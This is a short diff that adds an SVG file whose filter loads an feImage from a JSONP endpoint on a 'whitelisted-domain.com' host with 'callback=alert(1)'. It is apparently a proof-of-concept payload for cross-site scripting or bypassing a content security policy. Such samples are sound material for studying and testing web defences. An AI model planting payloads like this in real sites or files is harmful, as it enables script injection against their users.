@@ -1,0 +1,6 @@
+<svg>
+  <filter id="a">
+    <feImage xlink:href="https://whitelisted-domain.com/jsonp-endpoint?callback=alert(1)"></feImage>
+  </filter>
+  <rect width="100%" height="100%" filter="url(#a)" />
+</svg>
